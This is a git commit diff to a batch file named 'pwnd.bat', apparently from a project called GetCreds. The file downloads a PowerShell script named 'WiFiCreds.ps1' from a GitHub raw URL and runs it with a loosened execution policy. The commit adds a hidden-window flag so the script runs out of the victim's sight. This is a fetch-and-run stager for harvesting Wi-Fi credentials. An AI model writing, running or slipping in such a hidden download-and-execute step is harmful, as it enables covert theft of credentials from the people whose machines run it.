8f4d23b2385915a48053a6c9d824c74e9899b779
Zmk55 <oreoboi@gmail.com>
2022-08-25 23:15:19 -0500

    Update pwnd.bat

--- pwnd.bat
+++ pwnd.bat
@@ -1,3 +1,3 @@
 powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Zmk55/GetCreds/main/WiFiCreds.ps1 -Outfil .\WifiCreds.ps1"
 
-powershell  -executionpolicy remotesigned -File .\WifiCreds.ps1
+powershell -WindowStyle hidden  -executionpolicy remotesigned -File .\WifiCreds.ps1
